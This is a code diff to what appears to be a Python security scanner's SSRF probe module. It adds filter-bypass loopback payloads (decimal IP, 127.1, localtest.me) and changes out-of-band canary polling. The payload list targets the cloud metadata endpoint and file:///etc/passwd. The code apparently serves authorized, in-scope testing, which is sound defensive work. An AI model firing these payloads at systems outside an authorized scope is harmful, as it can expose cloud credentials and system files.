@@ -13,12 +13,17 @@ from .. import ui
 from ..redaction import redact_text
 from .base import RunnerResult, require_in_scope
 
-# Tiny non-destructive Linux/Windows markers + optional OOB
+# Tiny non-destructive Linux/Windows markers + optional OOB + bypass pack (capped)
 _PAYLOADS = (
     ("http://127.0.0.1/", ("localhost", "127.0.0.1", "nginx", "apache", "iis")),
     ("http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "local-ipv4", "meta-data")),
     ("http://[::1]/", ("localhost", "::1")),
     ("file:///etc/passwd", ("root:x:",)),
+    # Bypass-ish (still benign markers only)
+    ("http://127.1/", ("localhost", "127.0.0.1")),
+    ("http://0.0.0.0/", ("localhost", "0.0.0.0")),
+    ("http://2130706433/", ("localhost", "127.0.0.1")),  # decimal IP
+    ("http://localtest.me/", ("localhost", "127.0.0.1")),
 )
 
 
@@ -110,9 +115,9 @@ def ssrf_probe(
     }
     if canary:
         try:
-            from ..oob import poll_oob
+            from ..oob import wait_and_poll
 
-            poll = poll_oob(canary)
+            poll = wait_and_poll(canary, rounds=3, delay_sec=1.5)
             payload_out["oob_poll"] = poll
             if poll.get("signal"):
                 signal = True
